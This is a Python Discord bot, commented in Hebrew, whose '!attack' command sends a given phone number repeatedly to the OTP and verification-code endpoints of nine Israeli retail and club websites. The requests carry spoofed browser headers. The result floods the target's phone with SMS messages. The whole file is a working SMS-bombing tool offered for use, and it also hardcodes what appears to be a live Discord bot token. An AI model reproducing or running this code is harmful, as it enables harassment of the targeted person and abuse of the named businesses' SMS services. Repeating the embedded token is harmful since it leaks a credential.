import discord
from discord.ext import commands
import requests
import time
import uuid
import os
from flask import Flask
from threading import Thread

# --- שרת Flask לשמירה על הבוט בחיים ב-Render ---
app = Flask('')
@app.route('/')
def home(): return "<h1>Discord Turbo Bot Online</h1>"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרות בוט דיסקורד ---
TOKEN = 'MTQ5MzEzMTA0MDM1NTUxNjUyOA.GyvMkz.ygBZLghoE_bM6-OBLq3L0RI11v6E6PmX0oB5Gg' 
ADMIN_ID = 1281295891579408418  # ה-ID שלך
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# --- פונקציית התקיפה (טורבו עם כל האתרים) ---
def send_spam(target):
    apis = [
        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target}, "type": "form", "ref": "https://www.ace.co.il/"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
        {"n": "Atmos General", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 6, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://footlocker.co.il/"},
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://fox.co.il/"},
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
        {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
        {"n": "Machsanei Hashmal", "u": "https://api-ns.atmos.co.il/rest/2/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 2, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"}
    ]
    
    success_count = 0
    for site in apis:
        try:
            h = {"User-Agent": "Mozilla/5.0", "Referer": site["ref"]}
            if site["type"] == "json":
                res = requests.post(site["u"], json=site["d"], headers=h, timeout=0.8)
            else:
                res = requests.post(site["u"], data=site["d"], headers=h, timeout=0.8)
            if res.status_code in [200, 201, 204]: 
                success_count += 1
        except: 
            pass
    return success_count

# --- פקודות ---

@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user.name}')

@bot.command()
async def attack(ctx, phone: str, rounds: int = 1):
    # בדיקת אדמין
    if ctx.author.id != ADMIN_ID:
        await ctx.send("❌ You are not authorized!")
        return

    # הודעת התחלה
    status_msg = await ctx.send(f"⚡ Starting Turbo Attack on {phone}...")
    
    for r in range(rounds):
        success = send_spam(phone)
        # עדכון ההודעה הקיימת כדי לא להספים את הערוץ
        await status_msg.edit(content=f"🚀 Round {r+1}/{rounds} | Success: {success}/9")
        
        if r < rounds - 1:
            time.sleep(0.01) # דיליי טורבו מינימלי
    
    await ctx.send(f"🏁 Done! Finished {rounds} rounds on {phone}.")

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
